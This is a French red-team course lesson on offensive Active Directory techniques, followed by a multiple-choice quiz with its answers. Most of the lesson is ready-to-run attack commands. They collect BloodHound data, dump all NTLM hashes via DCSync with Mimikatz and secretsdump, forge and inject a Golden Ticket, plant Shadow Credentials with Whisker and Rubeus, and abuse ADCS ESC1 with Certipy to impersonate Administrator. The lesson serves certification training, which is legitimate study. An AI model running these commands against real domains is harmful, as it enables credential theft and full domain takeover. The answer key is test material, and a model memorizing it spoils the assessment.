# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 253 (6h) : Active Directory Offensive Avancé (BloodHound, DCSync, Shadow Credentials, ADCS ESC1-ESC8 & Pass-the-Certificate)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques offensives **Active Directory (AD)** de niveau expert ciblées dans les certifications **CRTO (Certified Red Team Operator)** et **CRTE (Certified Red Team Expert)** : cartographier les chemins d'attaque avec **BloodHound**, exécuter **DCSync** pour dumper les hashs NTLM du DC, abuser de **Shadow Credentials** pour l'escalade de privilèges, et exploiter les mauvaises configurations **ADCS (Active Directory Certificate Services)** via les 8 ESC Attack Paths.
>
> **Compétences visées :** `RED-03` (A) — Active Directory Offensive Expert | `CERT-01` (A) — CRTO/CRTE Attack Paths

---

## 1) Module — BloodHound & Cartographie des Chemins d'Attaque AD (1h30)

### 📖 Narration/Intuition

**BloodHound** est l'outil le plus puissant du Red Teamer pour cartographier automatiquement les chemins d'escalade de privilèges dans un domaine Active Directory. Il utilise la théorie des graphes pour identifier les relations de confiance cachées entre objets AD (utilisateurs, groupes, GPO, OU, ACL) et trouver le chemin le plus court vers **Domain Admin**.

### 🛠️ Atelier Pratique

**Collection de données AD avec SharpHound et analyse BloodHound (`bloodhound_workflow.sh`) :**

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Collecte des données AD avec SharpHound
# ═══════════════════════════════════════════════════════

# Depuis un host Windows compromis dans le domaine
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Collecte depuis Linux (sans accès Windows) avec BloodHound Python
pip install bloodhound
bloodhound-python -u 'jdoe' -p 'Password123' \
                  -ns 192.168.1.10 \
                  -d company.local \
                  -c All

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Import dans BloodHound (Neo4j)
# ═══════════════════════════════════════════════════════
# Démarrer Neo4j
sudo neo4j start
# Ouvrir BloodHound GUI et importer le .zip SharpHound

# ═══════════════════════════════════════════════════════
# ÉTAPE 3 — Requêtes Cypher critiques (Neo4j)
# ═══════════════════════════════════════════════════════

# Trouver tous les chemins vers Domain Admins depuis un utilisateur compromis
MATCH p=shortestPath((u:User {name:"JDOE@COMPANY.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@COMPANY.LOCAL"}))
RETURN p

# Trouver les utilisateurs avec GenericAll sur un Domain Admin
MATCH p=(u:User)-[:GenericAll]->(t:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS@COMPANY.LOCAL"})
RETURN p

# Trouver tous les AS-REP Roastable users (Kerberos Pre-Auth désactivée)
MATCH (u:User {dontreqpreauth: true}) WHERE u.enabled = true RETURN u.name

# Trouver tous les Kerberoastable users (SPN défini, non-admin)
MATCH (u:User {hasspn: true}) WHERE u.enabled = true AND NOT u.admincount = true RETURN u.name, u.serviceprincipalnames
```

---

## 2) Module — DCSync & Dump des Hashs NTLM (1h30)

### 📖 Narration/Intuition

L'attaque **DCSync** n'exige pas l'accès physique ou RDP au Domain Controller. Elle simule le comportement d'un contrôleur de domaine secondaire effectuant une **réplication AD** — et demande au DC primaire de lui fournir les hashs NTLM de tous les comptes, y compris **KRBTGT** (clé du Golden Ticket).

**Prérequis :** Droits `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All` (détenus par défaut par Domain Admins, Enterprise Admins et SYSTEM).

### 🛠️ Atelier Pratique

**DCSync via Mimikatz et secretsdump.py (`dcsync_attack.sh`) :**

```bash
# ═══════════════════════════════════════════════════════
# OPTION 1 — Mimikatz DCSync (depuis Windows compromis avec droits suffisants)
# ═══════════════════════════════════════════════════════
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:company.local /all /csv" "exit"

# Dump d'un compte spécifique (KRBTGT pour Golden Ticket)
mimikatz.exe "lsadump::dcsync /domain:company.local /user:krbtgt" "exit"

# ═══════════════════════════════════════════════════════
# OPTION 2 — Impacket secretsdump.py (depuis Linux, accès réseau DC)
# ═══════════════════════════════════════════════════════
python3 /opt/impacket/examples/secretsdump.py \
  -just-dc-ntlm \
  'company.local/da_user:Password123@192.168.1.10'

# Résultat type :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f4bae9c3e9e2c11e8a3d4567abc8def:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4a5b6c7d8e9a0b1c2d3e4f5a6b7c8d9:::
# jdoe:1234:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::

# ═══════════════════════════════════════════════════════
# Création d'un Golden Ticket avec le hash KRBTGT
# ═══════════════════════════════════════════════════════
mimikatz.exe "kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:f4a5b6c7d8e9a0b1c2d3e4f5a6b7c8d9 /ticket:golden.kirbi" "exit"

# Injection du ticket Golden dans la session courante
mimikatz.exe "kerberos::ptt golden.kirbi" "exit"
dir \\dc01\C$  # Accès complet au DC
```

---

## 3) Module — Shadow Credentials & ADCS ESC1/ESC8 (3h)

### 📖 Narration/Intuition

**Shadow Credentials** est une technique d'escalade de privilèges AD qui abuse de l'attribut `msDS-KeyCredentialLink` : en ajoutant une clé publique contrôlée par l'attaquant sur un objet AD cible, il peut s'authentifier comme cette cible via Kerberos PKINIT (certificate-based) — sans jamais modifier le mot de passe.

**ADCS (Active Directory Certificate Services)** est souvent la cible la plus facile dans un domaine AD moderne. Les 8 chemins d'attaque ESC (Escalation Paths) permettent de passer de Simple User à Domain Admin en exploitant des mauvaises configurations de templates de certificats.

### 🛠️ Atelier Pratique

**Shadow Credentials avec Whisker (`shadow_credentials.sh`) :**

```bash
# ═══════════════════════════════════════════════════════
# Shadow Credentials — Abus de msDS-KeyCredentialLink
# ═══════════════════════════════════════════════════════

# Prérequis : droits d'écriture sur un objet AD cible (GenericWrite/GenericAll)

# 1) Ajouter une Shadow Credential sur le compte cible
Whisker.exe add /target:da_user /domain:company.local /dc:dc01.company.local

# Résultat : Whisker génère une clé RSA, l'encode en Base64 et l'écrit dans
# msDS-KeyCredentialLink de "da_user". Il fournit également la commande Rubeus.

# 2) Obtenir un TGT Kerberos en s'authentifiant avec la clé privée générée
Rubeus.exe asktgt /user:da_user \
           /certificate:MIIKvAIBAzCCCngG... \
           /password:ShadowPass123 \
           /domain:company.local \
           /dc:dc01.company.local \
           /ptt

# 3) Extraire le hash NT via PKINIT (pour PTH)
Rubeus.exe asktgt /user:da_user /certificate:... /getcredentials /show

# ═══════════════════════════════════════════════════════
# ADCS ESC1 — Escalade via Template de Certificat Mal Configuré
# ═══════════════════════════════════════════════════════

# ESC1 : Template permettant au sujet demandeur de spécifier un Subject Alternative Name (SAN)
# → On demande un certificat avec SAN = Administrator@company.local

# 1) Identifier les templates vulnérables à ESC1 avec Certipy
certipy find -u 'jdoe@company.local' -p 'Password123' -dc-ip 192.168.1.10 -vulnerable -stdout

# 2) Demander un certificat en spécifiant le SAN d'un Domain Admin
certipy req -u 'jdoe@company.local' -p 'Password123' \
            -dc-ip 192.168.1.10 \
            -ca 'company-CA' \
            -template 'UserAuthentication' \
            -upn 'administrator@company.local'

# Résultat : administrator.pfx (certificat pour le compte Administrator)

# 3) Utiliser le certificat pour obtenir le hash NT via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Résultat : administrator:8f4bae9c3e9e2c11e8a3d4567abc8def (hash NT = PTH possible)
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **CRTO** | Certified Red Team Operator — Certification Red Team AD avancée (ZeroPoint Security) |
| **CRTE** | Certified Red Team Expert — Niveau supérieur CRTO (AD forests complexes) |
| **DCSync** | Domain Controller Synchronization — Attaque simulant la réplication AD pour dumper les hashs |
| **ADCS** | Active Directory Certificate Services — Infrastructure PKI intégrée à Active Directory |
| **ESC1-ESC8** | Escalation Paths 1 à 8 — 8 chemins d'attaque ADCS documentés par SpecterOps |
| **Shadow Credentials** | Abus de msDS-KeyCredentialLink pour authentification Kerberos PKINIT sans modifier le mdp |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle est la condition nécessaire pour exécuter une attaque **DCSync** sans être Domain Admin ?
- A) Posséder les droits AD `DS-Replication-Get-Changes` ET `DS-Replication-Get-Changes-All` sur l'objet de domaine racine
- B) Avoir un accès RDP au Domain Controller
- C) Être membre du groupe "Backup Operators"
- D) Posséder un compte de service avec SPN enregistré

**Réponse : A**

**Q2 :** Quel attribut Active Directory la technique **Shadow Credentials** abuse-t-elle pour permettre une authentification Kerberos PKINIT sans modifier le mot de passe d'un compte ?
- A) `msDS-KeyCredentialLink` — Stocke des clés publiques alternatives pour l'authentification par certificat
- B) `userPassword`
- C) `servicePrincipalName`
- D) `msDS-GroupMSAMembership`

**Réponse : A**

**Q3 :** Dans l'attaque **ADCS ESC1**, quelle propriété d'un template de certificat le rend vulnérable ?
- A) La permission pour le demandeur de spécifier un **Subject Alternative Name (SAN)** arbitraire, combinée avec l'authentification Client + des droits d'enrollment pour des utilisateurs non-admins
- B) L'absence de chiffrement du template
- C) La durée de validité trop longue du certificat
- D) L'absence de CRL (Certificate Revocation List)

**Réponse : A**

**Q4 :** Pourquoi le hash **KRBTGT** est-il la cible prioritaire lors d'un DCSync ?
- A) Il est la clé de signature de tous les tickets Kerberos (TGT) du domaine — Sa possession permet de créer des **Golden Tickets** valides pour n'importe quel compte, contournant toute authentification
- B) C'est le mot de passe du compte Administrateur local
- C) Il déchiffre les communications WMI
- D) Il est nécessaire pour l'accès aux shares SYSVOL

**Réponse : A**

**Q5 :** Quel outil en ligne de commande Python (Impacket) permet d'exécuter un DCSync depuis un système Linux en s'authentifiant via NTLM sur un DC Windows ?
- A) `secretsdump.py` avec l'option `-just-dc-ntlm`
- B) `psexec.py`
- C) `GetUserSPNs.py`
- D) `smbclient.py`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
